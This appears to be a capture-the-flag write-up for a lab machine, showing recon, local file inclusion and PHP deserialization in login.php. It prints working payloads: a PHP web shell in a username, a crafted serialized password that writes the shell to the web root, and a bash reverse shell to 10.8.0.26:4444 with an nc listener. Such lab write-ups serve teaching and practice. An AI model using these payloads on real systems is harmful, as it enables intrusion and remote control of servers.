# Object Injection

>## Difficulty: HARD
>#### user bfad4066a5baf52ea451e731fdf43aaa
>#### root 5704bd37d19e605f33f21d9a4e0a9d7b 

## Description
API service without good management of sessions saved to file, allowing deserialization.


## Technical description
Web API vulnerable to deserialization, files of interest can be found thanks to a Web Content Scanner with common wordlists (e.g gobuster,common.txt). Through docs.php an attacker can get an LFI (Local File Inclusion), thanks to lfi read the source code of the Web Api. From the register.php, understood the code flow, the attacker can be able to do an object injection and create a file in order to obtain a web shell. Read the user flag, overwriting the file in the /var/tmp folder owned by root and executed by a cron job the attacjer can get a root shell and able to read the root flag.

## Writeup

Nmap scan reveral Apache running on port 80.
![nmap](https://github.com/Arkango/pwnx_writeup/raw/main/object_injection/images/nmap.png)

> `-sC default scripts`

> `-sV service version`
Using gobuster with common.txt wordlist and php extension filter it's possible found the following files.
* /index.php
* /login.php
* /register.php 
* /docs.php
![gobuster](https://github.com/Arkango/pwnx_writeup/raw/main/object_injection/images/gobuster.png)
![gobuster2](https://github.com/Arkango/pwnx_writeup/raw/main/object_injection/images/gobuster2.png)


Docs's page shows the following message.

`This is an example. We need to provide more documentation. If you want to read a specific documentation page, use the doc parameter. Thank you 145`

Using the `doc` GET parameter an attacker could be able to obtain an LFI (Local file inclusion) and read the source code.

![register](https://github.com/Arkango/pwnx_writeup/raw/main/object_injection/images/register.png)
![register2](https://github.com/Arkango/pwnx_writeup/raw/main/object_injection/images/register2.png)

Retrieved the source code of the above files, the attacker can be able to find the deserialization vulnerability in login.php line 29 `$user_line = unserialize($line[0]);`.

Executing several registrations with a POST request with the following content

- username `username \n*12 <?php echo system($_GET['cmd']) ?>`
- password `A";s:3:"log";b:1;s:4:"path";s:23:"/var/www/html/pwned.php";s:1:"a";s:1:"b";`

and failing the consecutive login attemps, an attacker could be able to obtain a web shell.


At http://machineip/pwnwed.php the attacker interact with the webshell.

![cmd](https://github.com/Arkango/pwnx_writeup/raw/main/object_injection/images/cmd.png)


Command to open the reverse shell `/bin/bash -c 'bash -i >& /dev/tcp/10.8.0.26/4444 0>&1'`
Attacker machine `nc -l 4444`


![curl](https://github.com/Arkango/pwnx_writeup/raw/main/object_injection/images/curl.png)


In the screenshoot the command is URL encoded `%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.8.0.26%2F4444%200%3E%261%27`

![revers](https://github.com/Arkango/pwnx_writeup/raw/main/object_injection/images/revers.png)